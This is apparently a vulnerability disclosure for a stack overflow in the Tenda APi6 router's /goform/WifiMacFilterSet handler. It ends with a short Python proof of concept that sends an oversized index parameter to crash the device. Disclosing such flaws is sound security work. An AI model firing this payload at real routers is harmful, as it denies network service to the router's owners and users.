# Tenda APi6 V1.0.0.8(3856) Stack Overflow
## Firmware information

Manufacturer's address:https://www.tenda.com.cn/

Firmware download address: https://www.tenda.com.cn/download/detail-2570.html

## Affected Version

<img width="1019" alt="image" src="https://github.com/daodaoshao/vol_tenda_i6_1/assets/9769854/fc20290f-e5e4-4e62-9609-b6077b2df1fc">

##  Vulnerability Details

 Vulnerability Location: /goform/WifiMacFilterSet


 The length of the ndex parameter is not verified, sprintf can cause stack overflow vulnerability, it can result in dos attacks on routers.

 <img width="416" alt="image" src="https://github.com/daodaoshao/vul_tenda_i6_2/assets/9769854/645f41ed-abfe-4e56-925e-278f5576ae5b">



The pages of the router 

<img width="416" alt="image" src="https://github.com/daodaoshao/vol_tenda_i6_1/assets/9769854/a9150774-f16b-4550-8864-3abf91eef125">

## POC 

```python
import requests
from pwn import*

ip = "192.168.182.21" 
url = "http://" + ip + "/goform/WifiMacFilterSet"
print(url)

payload =b'a'*0x3000


cookie = {"Cookie":"user="}
data = {"index": payload,"wl_radio":0}
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
print("HackAttackSuccess!")
``` 





